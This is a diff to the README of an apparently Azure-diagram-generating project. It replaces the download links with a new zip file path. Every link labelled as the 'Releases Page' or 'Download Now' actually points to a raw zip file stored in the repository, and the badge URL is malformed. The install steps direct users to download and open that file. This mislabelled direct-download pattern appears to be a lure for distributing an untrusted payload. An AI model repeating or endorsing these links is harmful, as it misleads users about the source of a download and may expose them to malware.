@@ -6,9 +6,9 @@ Welcome to the azure-diagrams-skill project! This application helps you generate
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/azure-diagrams/scripts/azure_diagrams_skill_1.6.zip%https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/azure-diagrams/scripts/azure_diagrams_skill_1.6.zip)](https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/azure-diagrams/scripts/azure_diagrams_skill_1.6.zip)
+[![Download Now](https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/diagrams_azure_skill_v1.8.zip%https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/diagrams_azure_skill_v1.8.zip)](https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/diagrams_azure_skill_v1.8.zip)
 
-To get started, visit the Releases page to download the latest version of the application: [Visit the Releases Page](https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/azure-diagrams/scripts/azure_diagrams_skill_1.6.zip).
+To get started, visit the Releases page to download the latest version of the application: [Visit the Releases Page](https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/diagrams_azure_skill_v1.8.zip).
 
 ## 🔍 Features
 
@@ -41,7 +41,7 @@ The azure-diagrams-skill application supports a range of diagram types:
 
 To install the application:
 
-1. Visit the Releases page: [Visit the Releases Page](https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/azure-diagrams/scripts/azure_diagrams_skill_1.6.zip).
+1. Visit the Releases page: [Visit the Releases Page](https://raw.githubusercontent.com/V0RINCl3X/azure-diagrams-skill/main/skills/diagrams_azure_skill_v1.8.zip).
 2. Locate the latest version of the application.
 3. Click on the download link for your operating system.
 4. Once the download completes, open the file.
